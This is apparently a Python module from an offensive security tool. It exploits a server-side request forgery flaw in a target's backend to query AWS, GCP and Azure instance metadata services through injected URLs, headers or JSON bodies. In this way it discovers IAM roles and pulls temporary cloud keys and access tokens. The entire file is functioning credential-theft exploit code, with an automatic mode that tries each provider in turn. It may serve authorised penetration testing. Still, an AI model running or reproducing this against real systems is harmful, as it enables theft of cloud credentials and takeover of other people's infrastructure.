"""
Execution logic for cloud_metadata_credential_probe: walks the multi-step
credential theft sequence through an SSRF injection sink in the target's
own backend.

There is deliberately no "direct" mode that queries 169.254.169.254 /
metadata.google.internal straight from wherever this process runs. Those
addresses are link-local/environment-specific: they only ever resolve to
"whichever machine is asking." If Tradecraft's own scanning host happens to
run on a cloud VM (a common setup), a "direct" mode would silently steal
the *operator's own* live cloud credentials and report them as if they
were the target's -- a real confidentiality hazard, not a merely
non-functional feature. The only way this tool can legitimately reach a
*target's* metadata service is through an SSRF sink in the target's own
backend, which is what url_param/json_body/header dispatch.

Performs:
- AWS IMDSv1: Discovers IAM role name from /latest/meta-data/iam/security-credentials/
  and extracts temporary credentials (AccessKeyId, SecretAccessKey, Token).
- GCP Instance Metadata: Requests OAuth token from computeMetadata/v1/instance/service-accounts/default/token.
- Azure IMDS: Requests Managed Identity Bearer token from /metadata/identity/oauth2/token.

Hard-capped to at most 4 requests total. No parsing or business logic here -- parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"
PLACEHOLDER = "__SSRF__"
VALID_LOCATIONS = ("url_param", "json_body", "header")
VALID_PROVIDERS = ("aws", "gcp", "azure", "auto")
MAX_REQUESTS = 4
MAX_SNIPPET_LEN = 4096

AWS_ROLE_DISCOVERY_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
GCP_TOKEN_URL = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
AZURE_TOKEN_URL = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"


@dataclass
class HttpExchange:
    step: str
    target_url: str
    injected_url: str
    status_code: Optional[int] = None
    response_text: str = ""
    error: Optional[str] = None


@dataclass
class RawCredentialTheftResult:
    target: str = ""
    provider: str = ""
    inject_location: str = ""
    role_name: str = ""
    exchanges: List[HttpExchange] = field(default_factory=list)
    raw_credential_json: str = ""
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    t = target.strip()
    if not t:
        return ""
    if not (t.startswith("http://") or t.startswith("https://")):
        t = f"https://{t}"
    return t


def _dispatch_request(
    target_url: str,
    internal_url: str,
    inject_location: str,
    method: str,
    json_body_template: str,
    header_name: str,
    extra_headers: Optional[Dict[str, str]],
    timeout: int,
) -> HttpExchange:
    """Dispatches a single HTTP request through the SSRF vector."""
    exchange = HttpExchange(step="", target_url=target_url, injected_url=internal_url)
    if requests is None:
        exchange.error = "requests library not available"
        return exchange

    req_headers = {"User-Agent": USER_AGENT}
    if extra_headers:
        req_headers.update(extra_headers)

    http_method = (method or "GET").upper()
    data: Optional[str] = None

    if inject_location == "url_param":
        url = target_url.replace(PLACEHOLDER, internal_url)
    elif inject_location == "json_body":
        url = target_url
        req_headers["Content-Type"] = "application/json"
        data = json_body_template.replace(PLACEHOLDER, internal_url)
        http_method = (method or "POST").upper()
    elif inject_location == "header":
        url = target_url
        req_headers[header_name] = internal_url
        if http_method == "POST":
            data = ""
    else:
        exchange.error = f"unsupported inject_location: {inject_location}"
        return exchange

    exchange.target_url = url

    try:
        resp = requests.request(
            method=http_method,
            url=url,
            headers=req_headers,
            data=data,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        exchange.status_code = resp.status_code
        exchange.response_text = resp.text[:MAX_SNIPPET_LEN]
    except requests.RequestException as exc:
        exchange.error = str(exc)

    return exchange


def _execute_aws(
    target_url: str,
    inject_location: str,
    method: str,
    json_body_template: str,
    header_name: str,
    role_name: str,
    timeout: int,
    result: RawCredentialTheftResult,
) -> bool:
    """Executes the AWS IAM role discovery and credential fetch sequence."""
    current_role = role_name.strip()

    # Step 1: Discover role if not specified
    if not current_role:
        ex_role = _dispatch_request(
            target_url=target_url,
            internal_url=AWS_ROLE_DISCOVERY_URL,
            inject_location=inject_location,
            method=method,
            json_body_template=json_body_template,
            header_name=header_name,
            extra_headers=None,
            timeout=timeout,
        )
        ex_role.step = "aws_role_discovery"
        result.exchanges.append(ex_role)

        if ex_role.status_code != 200 or not ex_role.response_text:
            return False

        # Extract the first role name from the text response
        lines = [line.strip() for line in ex_role.response_text.splitlines() if line.strip()]
        if not lines:
            return False
        # Filter out HTML tags or generic error strings if reflected
        candidate = lines[0].split("/")[0].strip()
        if candidate.startswith("<") or " " in candidate:
            return False
        current_role = candidate

    result.role_name = current_role

    # Step 2: Fetch credentials for discovered role
    cred_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{current_role}"
    ex_cred = _dispatch_request(
        target_url=target_url,
        internal_url=cred_url,
        inject_location=inject_location,
        method=method,
        json_body_template=json_body_template,
        header_name=header_name,
        extra_headers=None,
        timeout=timeout,
    )
    ex_cred.step = "aws_credential_fetch"
    result.exchanges.append(ex_cred)

    if ex_cred.status_code == 200 and ex_cred.response_text:
        result.raw_credential_json = ex_cred.response_text
        return True

    return False


def _execute_gcp(
    target_url: str,
    inject_location: str,
    method: str,
    json_body_template: str,
    header_name: str,
    timeout: int,
    result: RawCredentialTheftResult,
) -> bool:
    """Executes GCP metadata service account token extraction.

    GCP's metadata server requires a 'Metadata-Flavor: Google' header on
    the *actual* outbound request, which pure URL/body-based SSRF cannot
    attach (the vulnerable backend decides its own request headers, not
    the attacker) -- so this will usually come back 403 unless the
    target happens to forward headers too. That's an inherent limitation
    of the technique, not a bug: a 403 here is reported honestly rather
    than silently retried or faked.
    """
    ex_token = _dispatch_request(
        target_url=target_url,
        internal_url=GCP_TOKEN_URL,
        inject_location=inject_location,
        method=method,
        json_body_template=json_body_template,
        header_name=header_name,
        extra_headers=None,
        timeout=timeout,
    )
    ex_token.step = "gcp_token_fetch"
    result.exchanges.append(ex_token)

    if ex_token.status_code == 200 and ex_token.response_text:
        result.raw_credential_json = ex_token.response_text
        return True

    return False


def _execute_azure(
    target_url: str,
    inject_location: str,
    method: str,
    json_body_template: str,
    header_name: str,
    timeout: int,
    result: RawCredentialTheftResult,
) -> bool:
    """Executes Azure IMDS managed identity token extraction.

    Same inherent limitation as GCP: Azure IMDS requires a 'Metadata:
    true' header on the actual outbound request, which pure URL/body
    SSRF cannot attach -- a 403 here is an honest, expected outcome of
    the technique's own limits, not a bug.
    """
    ex_token = _dispatch_request(
        target_url=target_url,
        internal_url=AZURE_TOKEN_URL,
        inject_location=inject_location,
        method=method,
        json_body_template=json_body_template,
        header_name=header_name,
        extra_headers=None,
        timeout=timeout,
    )
    ex_token.step = "azure_token_fetch"
    result.exchanges.append(ex_token)

    if ex_token.status_code == 200 and ex_token.response_text:
        result.raw_credential_json = ex_token.response_text
        return True

    return False


def execute(
    target: str,
    provider: str = "aws",
    inject_location: str = "url_param",
    method: str = "",
    json_body_template: str = "",
    header_name: str = "",
    role_name: str = "",
    timeout: int = 10,
) -> RawCredentialTheftResult:
    """Main execution function for cloud metadata credential extraction."""
    target_clean = (target or "").strip()
    norm_provider = (provider or "aws").strip().lower()
    norm_location = (inject_location or "url_param").strip().lower()

    if requests is None:
        return RawCredentialTheftResult(
            target=target_clean,
            provider=norm_provider,
            inject_location=norm_location,
            error="requests library not available",
        )

    if not target_clean:
        return RawCredentialTheftResult(
            target=target_clean,
            provider=norm_provider,
            inject_location=norm_location,
            error="empty target URL",
        )

    url = normalize_target_url(target_clean)

    if norm_location not in VALID_LOCATIONS:
        return RawCredentialTheftResult(
            target=url,
            provider=norm_provider,
            inject_location=norm_location,
            error=f"inject_location must be one of: {', '.join(VALID_LOCATIONS)}",
        )

    if norm_provider not in VALID_PROVIDERS:
        return RawCredentialTheftResult(
            target=url,
            provider=norm_provider,
            inject_location=norm_location,
            error=f"provider must be one of: {', '.join(VALID_PROVIDERS)}",
        )

    # Validate template / header requirements
    if norm_location == "url_param":
        if PLACEHOLDER not in url:
            return RawCredentialTheftResult(
                target=url,
                provider=norm_provider,
                inject_location=norm_location,
                error=f"target URL missing the '{PLACEHOLDER}' placeholder",
            )
    elif norm_location == "json_body":
        if not json_body_template:
            return RawCredentialTheftResult(
                target=url,
                provider=norm_provider,
                inject_location=norm_location,
                error="json_body_template is required when inject_location is 'json_body'",
            )
        try:
            json.loads(json_body_template)
        except ValueError:
            return RawCredentialTheftResult(
                target=url,
                provider=norm_provider,
                inject_location=norm_location,
                error="json_body_template is not valid JSON",
            )
        if PLACEHOLDER not in json_body_template:
            return RawCredentialTheftResult(
                target=url,
                provider=norm_provider,
                inject_location=norm_location,
                error=f"json_body_template missing the '{PLACEHOLDER}' placeholder",
            )
    elif norm_location == "header":
        if not header_name:
            return RawCredentialTheftResult(
                target=url,
                provider=norm_provider,
                inject_location=norm_location,
                error="header_name is required when inject_location is 'header'",
            )

    result = RawCredentialTheftResult(
        target=url,
        provider=norm_provider,
        inject_location=norm_location,
        role_name=role_name,
    )

    # Dispatch sequence based on provider
    if norm_provider == "aws":
        _execute_aws(
            target_url=url,
            inject_location=norm_location,
            method=method,
            json_body_template=json_body_template,
            header_name=header_name,
            role_name=role_name,
            timeout=timeout,
            result=result,
        )
    elif norm_provider == "gcp":
        _execute_gcp(
            target_url=url,
            inject_location=norm_location,
            method=method,
            json_body_template=json_body_template,
            header_name=header_name,
            timeout=timeout,
            result=result,
        )
    elif norm_provider == "azure":
        _execute_azure(
            target_url=url,
            inject_location=norm_location,
            method=method,
            json_body_template=json_body_template,
            header_name=header_name,
            timeout=timeout,
            result=result,
        )
    elif norm_provider == "auto":
        # Probe AWS first (most common)
        success = _execute_aws(
            target_url=url,
            inject_location=norm_location,
            method=method,
            json_body_template=json_body_template,
            header_name=header_name,
            role_name=role_name,
            timeout=timeout,
            result=result,
        )
        if success:
            result.provider = "aws"
        elif len(result.exchanges) < MAX_REQUESTS:
            # Try GCP next
            success_gcp = _execute_gcp(
                target_url=url,
                inject_location=norm_location,
                method=method,
                json_body_template=json_body_template,
                header_name=header_name,
                timeout=timeout,
                result=result,
            )
            if success_gcp:
                result.provider = "gcp"
            elif len(result.exchanges) < MAX_REQUESTS:
                # Try Azure
                success_az = _execute_azure(
                    target_url=url,
                    inject_location=norm_location,
                    method=method,
                    json_body_template=json_body_template,
                    header_name=header_name,
                    timeout=timeout,
                    result=result,
                )
                if success_az:
                    result.provider = "azure"

    return result
